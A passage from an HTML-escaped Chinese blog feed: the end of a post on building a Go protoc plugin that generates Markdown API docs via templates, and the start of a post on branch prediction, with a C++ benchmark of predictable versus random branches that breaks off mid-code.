&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetPrefix&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;protoc-gen-hello: &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">flags&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FlagSet&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">protogen&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Options&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">ParamFunc&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">flags&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Set&lt;/span>&lt;span class="p">}.&lt;/span>&lt;span class="nf">Run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Gen&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">Gen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">plugin&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">protogen&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Plugin&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">filename&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">plugin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FileToGenerate&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">g&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">plugin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewGeneratedFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">strings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ReplaceAll&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Base&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">filename&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;.proto&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;.md&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;# API 文档&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;## 结构定义&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">file&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">plugin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FilesByPath&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">filename&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">msg&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Messages&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;message: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FullName&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;### &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Name&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">svc&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Services&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;## 服务 &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FullName&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;service: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FullName&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">method&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Methods&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;method: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FullName&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;### 接口 &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Name&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意使用了 &lt;code>plugin.NewGeneratedFile&lt;/code>而不是直接&lt;code>os.Open&lt;/code>，因为这是&lt;code>protoc&lt;/code>插件的约定之一。&lt;code>protoc&lt;/code>插件系统允许插件提供&lt;code>insert point&lt;/code>，让别的插件修改插件生成的代码。不过目前我们没有这种功能，但遵循约定的方式来编写代码总是没坏处的。&lt;/p>
&lt;p>代码里会有很多没看懂的东西，比如 &lt;code>Desc&lt;/code> ，其实是&lt;code>Descriptor&lt;/code>的缩写。&lt;code>Descriptor&lt;/code>是一种设计模式，我自己的粗暴理解就是&lt;code>Descriptor&lt;/code>“描述”对象的结构和属性，借助&lt;code>Descriptor&lt;/code>来访问和修改对象。听起来像是反射，用起来也是反射的感觉。在 Python 里也有个 &lt;code>descriptor&lt;/code>，&lt;a class="link" href="https://docs.python.org/3/howto/descriptor.html" target="_blank" rel="noopener"
>Descriptor HowTo Guide&lt;/a>，和这里的&lt;code>Descriptor&lt;/code>有相似的地方，仅供参考。&lt;/p>
&lt;h3 id="模板化">模板化&lt;/h3>
&lt;p>虽然也能直接在代码里用 &lt;code>g.P&lt;/code> 完成生成工作，但是未免麻烦。&lt;code>g.P&lt;/code>这个接口实话说我觉得不行，怎么不实现一个&lt;code>StringWriter&lt;/code>。&lt;/p>
&lt;p>这里用模板最大的好处是能轻松地完成一大堆字符串拼接混合一些简单的逻辑的情况，如果用 go 代码实现会非常啰嗦。&lt;/p>
&lt;p>先展示下我使用的模板，代码太罗嗦就不贴了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">{{ define &amp;#34;message-link&amp;#34; -}}
{{ if .Message -}}
../../../{{ .Message.ParentFile.Path | base | replace &amp;#34;.proto&amp;#34; &amp;#34;&amp;#34; }}/types/{{ .Message.FullName | toString | replace &amp;#34;.&amp;#34; &amp;#34;_&amp;#34;}}/
{{- else if .Enum -}}
../../../{{ .Enum.ParentFile.Path | base | replace &amp;#34;.proto&amp;#34; &amp;#34;&amp;#34; }}/types/{{ .Enum.FullName | toString | replace &amp;#34;.&amp;#34; &amp;#34;_&amp;#34; }}/
{{- end }}
{{- end -}}
{{ define &amp;#34;message&amp;#34; -}}
&lt;span class="gs">**JSON:**&lt;/span>
&lt;span class="s">```json
&lt;/span>&lt;span class="s">&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="err">{&lt;/span> &lt;span class="err">.Desc&lt;/span> &lt;span class="err">|&lt;/span> &lt;span class="err">GenerateExample&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">}&lt;/span>
&lt;span class="s">```&lt;/span>
&lt;span class="gs">**字段说明:**&lt;/span>
|字段|类型|说明|
|----|----|----|
{{ range .Fields -}}
|`{{- .Desc.Name }}`|[`{{ template &amp;#34;field-type&amp;#34; .Desc }}`]({{template &amp;#34;message-link&amp;#34; .Desc }})|{{ .Comments | InlineMarkdownDocString | default &amp;#34;*此字段没有文档注释*&amp;#34;}}|
{{ end }}
{{- end -}}
&lt;span class="gh"># {{ .Desc.FullName | toString | replace &amp;#34;.&amp;#34; &amp;#34;_&amp;#34; }}
&lt;/span>&lt;span class="gh">&lt;/span>
{{ template &amp;#34;message&amp;#34; . }}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终生成结果就像是这样。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/protogen-code-generation/image-20220221161802205.png"
width="778"
height="404"
srcset="https://nnnewb.github.io/blog/blog/p/protogen-code-generation/image-20220221161802205_hu2efbed3d0c9645c8b3aebafcdc662339_25912_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/protogen-code-generation/image-20220221161802205_hu2efbed3d0c9645c8b3aebafcdc662339_25912_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="生成结果"
class="gallery-image"
data-flex-grow="192"
data-flex-basis="462px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>本身是个很简单的东西。原先用解析proto文件语法树再生成文档的方法不是不行，但一来第三方的解析库经常有不支持的语法和奇怪的bug，&lt;code>protoc&lt;/code>本身又是事实标准，官方的 DSL Specification 文档就是个废物文档，连 &lt;code>option(http) {}&lt;/code> 这样的都算是 specification 之外，还有 &lt;code>optional&lt;/code> 在 proto3 还能用之类的让人想骂傻逼的问题。&lt;/p>
&lt;p>后来改成了 &lt;code>typescript&lt;/code> + &lt;code>protobuf.js&lt;/code> ，官方支持的稳定性一下子就好多了，但这个跑起来性能实在有点拉，而且 ts 版本用了 &lt;code>ejs&lt;/code> 作为模板引擎，&lt;code>ejs&lt;/code>的标签写起来罗嗦到不行，内嵌 js 的写法一时爽，爽完自己都快看不懂写了什么玩意儿了。&lt;/p>
&lt;p>最后换回 &lt;code>go&lt;/code>+&lt;code>protogen&lt;/code>，一下子就舒服多了。&lt;/p></description></item><item><title>分支预测对执行效率和安全的影响</title><link>https://nnnewb.github.io/blog/p/how-branch-prediction-effects-executoin-performance-and-security/</link><pubDate>Wed, 16 Feb 2022 16:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/how-branch-prediction-effects-executoin-performance-and-security/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>还是从 &lt;em>Igor Ostrvsky&lt;/em> 的博客里发现的一篇有意思的文章，&lt;a class="link" href="http://igoro.com/archive/fast-and-slow-if-statements-branch-prediction-in-modern-processors/" target="_blank" rel="noopener"
>Fast and slow if-statements: branch prediction in modern processors&lt;/a> 开始。&lt;/p>
&lt;h2 id="分支预测对性能的影响">分支预测对性能的影响&lt;/h2>
&lt;h3 id="介绍">介绍&lt;/h3>
&lt;p>&lt;a class="link" href="https://zh.wikipedia.org/wiki/%E5%88%86%E6%94%AF%E9%A0%90%E6%B8%AC%E5%99%A8" target="_blank" rel="noopener"
>分支预测器 - Wikipedia&lt;/a> 我直接抄一段。&lt;/p>
&lt;blockquote>
&lt;p>在&lt;a class="link" href="https://zh.wikipedia.org/wiki/%e9%9b%bb%e8%85%a6%e6%9e%b6%e6%a7%8b" target="_blank" rel="noopener"
>计算机体系结构&lt;/a>中，&lt;strong>分支预测器&lt;/strong>（英语：Branch predictor）是一种&lt;a class="link" href="https://zh.wikipedia.org/wiki/%e6%95%b8%e4%bd%8d%e9%9b%bb%e8%b7%af" target="_blank" rel="noopener"
>数字电路&lt;/a>，在分支指令执行结束之前猜测哪一路&lt;a class="link" href="https://zh.wikipedia.org/wiki/%e5%88%86%e6%94%af_%28%e8%a8%88%e7%ae%97%e6%a9%9f%e7%a7%91%e5%ad%b8%29" target="_blank" rel="noopener"
>分支&lt;/a>将会被执行，以提高处理器的&lt;a class="link" href="https://zh.wikipedia.org/wiki/%e6%8c%87%e4%bb%a4%e6%b5%81%e6%b0%b4%e7%ba%bf" target="_blank" rel="noopener"
>指令流水线&lt;/a>的性能。使用分支预测器的目的，在于改善&lt;a class="link" href="https://zh.wikipedia.org/wiki/%e6%8c%87%e4%bb%a4%e7%ae%a1%e7%b7%9a%e5%8c%96" target="_blank" rel="noopener"
>指令流水线&lt;/a>的流程，就像一家公司的员工提前预测公司所需要的东西，即交付不同单位进行准备工作，而那各个部门之间的等待交办的时间大大地缩短，整个公司的效率就会提高了。现代使用&lt;a class="link" href="https://zh.wikipedia.org/wiki/%e6%8c%87%e4%bb%a4%e7%ae%a1%e7%b7%9a%e5%8c%96" target="_blank" rel="noopener"
>指令流水线&lt;/a>处理器的性能能够提高，分支预测器对于现今的指令流水线微处理器获得高性能是非常关键的技术。&lt;/p>
&lt;/blockquote>
&lt;p>现代 CPU 的分支预测没有 &lt;em>Igor Ostrvsky&lt;/em> 的博客里写的分支预测器那么傻了，实际上，那篇博客里的代码在 i5-6600 的环境下跑起来，&lt;code>TTFF&lt;/code>或者&lt;code>TTTTFFFF&lt;/code>甚至比&lt;code>TTTT&lt;/code>还要快。那篇博客创作于 2010 年， 而 Skylake 架构在 2015 年替代 Broadwell 架构，而现在是 2022年， Intel 已经发布了 GoldenCove ，AMD 也要发 Zen 4了。内容过时不可避免。&lt;/p>
&lt;p>所以这篇博客主要还是聊一下分支预测对性能的影响，但大概总结不出 Igor Ostrvsky 的博客里的规律。顺带一提，不要随便针对分支预测优化，要是有人看了 Igor Ostrvsky 那篇博客费了老大功夫优化成连续 T/F 分支，换上新 CPU 之后性能还倒退这能找谁说理去。针对微架构分支预测失败回退做优化我还在爆栈上看到个回答很有意思，&lt;a class="link" href="https://stackoverflow.com/questions/49932119/avoid-stalling-pipeline-by-calculating-conditional-early" target="_blank" rel="noopener"
>avoid stalling pipeline by calculating conditional early&lt;/a> ，很难想到还能用这种办法榨干 CPU 的每一滴性能。&lt;/p>
&lt;h3 id="基准测试">基准测试&lt;/h3>
&lt;p>这个基准测试的主要目的是体现出分支预测失败对执行时间的影响，测试方法是喂 10MB 的随机 T/F ，为 T 时计数器 +1。除了输入数据外测试代码一样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;functional&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;chrono&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;vector&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstdlib&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">chrono&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">benchmark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint32_t&lt;/span> &lt;span class="n">loops&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">function&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">milliseconds&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lowest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">highest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">loops&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">fn&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">d&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">duration_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">milliseconds&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stop&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">sum&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">lowest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lowest&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">d&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">lowest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">highest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">max&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">highest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; avg: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">sum&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">loops&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; best: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">lowest&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; worst: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">highest&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; total: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">sum&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">srand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">duration_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">seconds&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">time_since_epoch&lt;/span>&lt;span class="p">()).&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="n">vector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">always_true&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">unpredictable&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">always_true&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">unpredictable&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nl">i&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">unpredictable&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rand&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">benchmark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;always true&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">always_true&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">i&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">always_true&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">sum&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="n">benchmark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unpredictable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">unpredictable&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">i&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">unpredictable&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
